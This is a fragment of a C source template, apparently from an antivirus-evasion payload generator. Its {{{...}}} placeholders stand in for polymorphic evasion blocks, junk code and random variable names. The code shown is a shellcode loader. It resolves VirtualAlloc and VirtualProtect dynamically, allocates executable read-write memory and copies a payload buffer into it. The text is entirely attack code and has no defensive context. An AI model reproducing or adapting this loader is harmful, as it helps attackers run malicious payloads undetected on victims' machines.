    ...
    {{{MorphEvasion1}}}
        {{{MorphEvasion2}}}
            {{{MorphEvasion3}}}
                ...
                DWORD {{{Randresult}}};
                DWORD {{{Randthread}}};
                FARPROC {{{Ndcvirtual}}} = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");
                {{{Randlpv}}} = (LPVOID) {{{Ndcvirtual}}}(NULL, strlen({{{Randbufname}}}),0x3000,0x40);
                {{{Junkcode5}}}
                RtlMoveMemory({{{Randlpv}}},{{{Randbufname}}},strlen({{{Randbufname}}}));
                DWORD {{{Oldprot}}};
                FARPROC {{{Ndcvirtualpro}}} = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\");
